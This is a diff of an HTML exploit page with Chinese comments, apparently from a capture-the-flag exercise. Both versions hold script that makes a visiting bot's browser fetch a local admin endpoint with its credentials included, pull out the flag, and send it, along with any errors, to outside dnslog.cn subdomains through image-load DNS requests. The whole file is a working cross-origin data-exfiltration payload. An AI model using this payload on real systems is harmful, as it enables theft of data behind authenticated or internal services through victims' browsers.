@@ -1,19 +1,19 @@
-<!-- exploit.html -->
 <script>
-  (async () => {
-    try {
-      // 关键：请求靶机本地的 admin 接口
-      const res = await fetch('http://127.0.0.1:3000/admin', { credentials: 'include' });
-      const data = await res.json();
-      let flag = data.flag || 'no-flag';
-      // 清理为合法 DNS 子域名
-      flag = flag.replace(/[^a-zA-Z0-9]/g, '-').substring(0, 60);
-      // 外带
-      new Image().src = 'http://' + flag + '.mfvewv.dnslog.cn';
-    } catch (e) {
-      // 外带错误（用于调试）
-      const err = ('ERR:' + e.message).replace(/[^a-zA-Z0-9]/g, '-').substring(0, 50);
-      new Image().src = 'http://' + err + '.aop8r0.dnslog.cn';
-    }
-  })();
+  // 先外带一个确定的 DNS 请求（测试通道）
+  new Image().src = 'http://test-from-bot.mfvewv.dnslog.cn';
+
+  // 再尝试请求 /admin
+  try {
+    fetch('http://127.0.0.1:3000/admin', { credentials: 'include' })
+      .then(r => r.json())
+      .then(d => {
+        let f = d.flag.replace(/[^a-z0-9]/gi, '-');
+        new Image().src = 'http://' + f + '.aop8r0.dnslog.cn';
+      })
+      .catch(e => {
+        new Image().src = 'http://catch-' + btoa(e.message).replace(/=/g, '') + '.aop8r0.dnslog.cn';
+      });
+  } catch (e) {
+    new Image().src = 'http://try-catch-' + btoa(e.message).replace(/=/g, '') + '.aop8r0.dnslog.cn';
+  }
 </script>
